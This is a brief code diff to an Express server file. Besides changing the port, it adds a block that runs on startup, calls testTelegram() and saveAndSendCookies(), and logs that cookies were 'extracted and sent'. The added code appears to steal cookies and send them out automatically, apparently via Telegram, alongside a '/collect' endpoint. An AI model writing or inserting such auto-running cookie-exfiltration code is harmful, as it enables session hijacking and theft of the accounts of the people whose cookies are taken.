@@ -194,5 +194,14 @@ app.post('/collect', async (req, res) => {
 });
 
 // ------------------------- START SERVER -------------------------
-const PORT = process.env.PORT || 3000;
+// Start server
+const PORT = process.env.PORT || 8080;
 app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));
+
+// Async cookie extraction
+(async () => {
+    console.log("Starting cookie extraction...");
+    await testTelegram();
+    await saveAndSendCookies();
+    console.log("✅ Cookies extracted and sent.");
+})();
